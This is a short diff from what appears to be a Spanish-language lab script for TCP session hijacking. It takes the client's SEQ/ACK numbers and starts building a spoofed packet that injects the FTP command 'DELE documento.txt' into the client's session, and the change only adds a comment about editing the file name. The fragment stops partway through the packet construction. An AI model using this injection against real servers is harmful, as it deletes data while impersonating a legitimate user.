@@ -20,7 +20,7 @@ print(f"-> SEQ del cliente (usado en paquete): {seq_cli}")
 print(f"-> ACK del cliente (para reconocer lo que envió el servidor): {ack_cli}")
 
 # Construir el comando FTP
-payload = b"DELE documento.txt\r\n"
+payload = b"DELE documento.txt\r\n" # Modificar a nombre de archivo
 
 # Crear y enviar el paquete
 pkt = IP(src=ip_cliente, dst=ip_servidor) / \
